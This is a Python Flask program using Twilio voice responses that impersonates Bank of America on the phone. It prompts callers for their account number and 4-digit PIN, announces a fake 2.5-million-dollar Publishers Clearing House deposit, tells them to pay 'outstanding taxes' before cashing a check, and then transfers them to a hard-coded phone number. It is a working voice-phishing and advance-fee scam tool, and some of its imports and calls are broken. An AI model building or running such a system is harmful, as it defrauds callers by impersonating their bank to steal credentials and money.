from random import choice
from flask import Flask, Request
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.twiml.voice_response import Dial, VoiceResponse, Say
import pause
import length




app = Flask(__name__)


@app.route("/voice", methods=['GET', 'POST'])
def voice():
    resp = VoiceResponse()
    gather = Gather(action='/voice2',
                        finishOnKey='#', input="dtmf", timeout="30")
    gather.say("Thanks for calling Bank of America, to get started please enter your account number followed by the pound key")
    resp.append(gather)
    resp.redirect('/voice2')
    return str(resp)





@app.route("/voice2", methods=['GET', 'POST'])
def voice2():
    resp = VoiceResponse()
    gather = Gather(action='/voice3',
                        finishOnKey='#', input="dtmf", timeout="30")
    



    resp.say("For the security of your account, please enter your 4 digit pin number followed by the number sign")
    resp.append(gather)
    resp.redirect('/voice3')
    return str(resp)







@app.route("/voice3", methods=['GET', 'POST'])
def voice3():
    resp = VoiceResponse()



    resp.say("your checking account have an available balance of 2.5 million dollars which may include pending transactions")
    resp.pause(length=1)
    resp.say("You have a pending deposit of 2.5 million dollars from the publishers clearing house")
    resp.pause(length=1)
    resp.say("if you receive a cashiers check in your mail for 2.5 million dollars, please don't attempt to cash it until you pay your outstanding taxes on your prize winnings, or until you get the authorization from your agent")
    resp.pause(length=1)
    resp.say("for more information, please hold to be transferred to a live operator from bank of america")
    resp.pause(length=5)
    resp.redirect('forwardA')
    return str(resp)






@app.route("/forwardA", methods=['GET', 'POST'])
def callForwardA():
    
    resp = VoiceResponse()
    resp.dial('5182016746')
    resp.say('Goodbye')

    return str(resp)



if __name__ =="__main__":
    app.run(debug=True)